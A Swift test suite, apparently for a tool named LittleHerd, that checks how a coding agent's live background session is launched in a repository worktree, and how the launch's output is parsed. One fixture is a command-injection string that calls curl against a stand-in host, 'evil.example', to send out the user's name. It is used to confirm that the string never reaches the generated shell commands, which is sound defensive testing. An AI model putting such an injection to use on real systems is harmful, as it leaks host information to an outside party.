import Foundation
import Testing

@testable import LittleHerd

/// A move that leaves a session on the destination for a person to keep
/// talking to. See `SuccessorLaunch.Live` and roadmap item 10.
@Suite("Live successor")
struct LiveSuccessorTests {
    private static let hostileBrief = """
        Fix the crash'; curl evil.example/$(whoami); echo '
        """
    private static let repository = "/home/malpern/local-code/sandpiper"
    private static let branch = "transfer/herd-move-test-claudef0"

    private func plan(
        provider: AgentTaskProvider = .claude,
        agent: String = "/home/malpern/.local/share/mise/installs/claude/latest/claude",
        carried: String? = nil
    ) -> Result<SuccessorLaunch.Plan, SuccessorLaunch.Refusal> {
        SuccessorLaunch.plan(
            briefPath: "Documentation/transfers/herd-move-test-claudef0.md",
            briefText: Self.hostileBrief,
            branch: Self.branch,
            repository: Self.repository,
            scratchRoot: SuccessorLaunch.liveRoot(repository: Self.repository),
            provider: provider,
            reportedAgentPath: agent,
            expectedCommit: String(repeating: "a", count: 40),
            carriedSession: carried,
            live: SuccessorLaunch.Live(name: ".herd Move Test")
        )
    }

    private func steps(carried: String? = nil) throws -> [SuccessorRun.Step] {
        let plan = try plan(carried: carried).get()
        return SuccessorRun.steps(
            plan: plan,
            repository: Self.repository,
            branch: Self.branch,
            promptFile: "\(plan.workingDirectory).prompt",
            check: .xcode(scheme: "LittleHerd"),
            commitMessage: "Successor work"
        )
    }

    /// The worktree is inside the repository, because that is the only place
    /// Claude's per-repository trust covers.
    @Test
    func theWorktreeIsInsideTheRepository() throws {
        let plan = try plan().get()
        #expect(plan.workingDirectory
            == "\(Self.repository)/.claude/worktrees/transfer-herd-move-test-claudef0")
    }

    /// A background session in default mode, never one-shot `-p` and never
    /// with the one-shot run's no-shell boundary, which a person could not
    /// usefully talk to.
    @Test
    func itStartsABackgroundSessionThatAsksFirst() throws {
        let arguments = try plan().get().arguments
        #expect(arguments.starts(with: ["--bg", "--name", ".herd Move Test", "--permission-mode", "default"]))
        #expect(!arguments.contains("-p"))
        #expect(!arguments.contains("acceptEdits"))
    }

    @Test
    func aCarriedConversationIsForkedNotResumedAsItself() throws {
        let arguments = try plan(carried: "f011b047-16fd-4f1a-864f-8317e7f560ac").get().arguments
        #expect(arguments.suffix(3) == ["--resume", "f011b047-16fd-4f1a-864f-8317e7f560ac", "--fork-session"])
    }

    /// Codex has no background sessions, so a live plan for it is refused
    /// rather than quietly turned into something else.
    @Test
    func codexCannotBeLive() {
        let result = plan(provider: .codex, agent: "/home/malpern/.local/bin/codex")
        #expect(throws: SuccessorLaunch.Refusal.self) { try result.get() }
    }

    @Test
    func theBriefIsStillOnlySentEncoded() throws {
        for command in try steps().map(\.command) {
            #expect(!command.contains("curl evil.example"))
            #expect(!command.contains("$(whoami)"))
        }
    }

    /// No check and no push: the session owns its branch from here.
    @Test
    func nothingIsCheckedOrPushedForIt() throws {
        let purposes = try steps().map(\.purpose)
        #expect(purposes == [.worktree, .prompt, .agent, .cleanup])
        #expect(!(try steps().map(\.command).joined().contains("git push")))
    }

    /// An existing worktree can hold a session somebody is still talking to,
    /// so it is refused, never cleared, and the worktree is on the branch.
    @Test
    func anExistingWorktreeIsRefusedNotRemoved() throws {
        let worktree = try #require(try steps().first { $0.purpose == .worktree }).command
        #expect(worktree.contains("already on this machine"))
        #expect(!worktree.contains("rm -rf"))
        #expect(worktree.contains("worktree add -B '\(Self.branch)'"))
        #expect(worktree.contains("info/exclude"))
    }

    /// The session's worktree survives; one whose session never started does not.
    @Test
    func cleanupKeepsAStartedSessionsWorktree() throws {
        let all = try steps()
        let agent = try #require(all.first { $0.purpose == .agent }).command
        let cleanup = try #require(all.first { $0.purpose == .cleanup })
        #expect(agent.hasSuffix(".live'"))
        #expect(cleanup.command.contains("test -e"))
        #expect(!cleanup.isFatal)
    }

    @Test
    func thePreflightAnswersAreRead() {
        #expect(TransferDriver.liveAnswer("live\n") == .live)
        #expect(TransferDriver.liveAnswer("untrusted") == .untrusted)
        #expect(TransferDriver.liveAnswer("oneshot") == .oneShot)
        // No answer is the move that has always worked, not a guess.
        #expect(TransferDriver.liveAnswer("") == .oneShot)
        #expect(TransferDriver.liveAnswer("Traceback (most recent call last)") == .oneShot)
    }

    @Test
    func theTrustFixIsClaudeItselfInThatFolder() {
        #expect(TransferDriver.trustRemedy(agent: "/a/claude", repository: "/r", sshHost: "linux")
            == "ssh -t linux 'cd '\\''/r'\\'' && '\\''/a/claude'\\'''")
        #expect(TransferDriver.trustRemedy(agent: "/a/claude", repository: "/r", sshHost: nil)
            == "cd '/r' && '/a/claude'")
    }

    /// The line `claude --bg` prints, as measured on linux, after the line it
    /// sometimes prints first.
    @Test
    func theBackgroundSessionIsReadFromWhatBgPrints() {
        let printed = """
            Starting background service…
            backgrounded · 472f7442 · shape test
              claude agents             list sessions
            """
        #expect(SuccessorOutcome.backgroundSession(in: printed) == "472f7442")
        #expect(SuccessorOutcome.backgroundSession(in: "backgrounded · not-an-id · x") == nil)
        #expect(SuccessorOutcome.backgroundSession(in: "") == nil)
    }
}
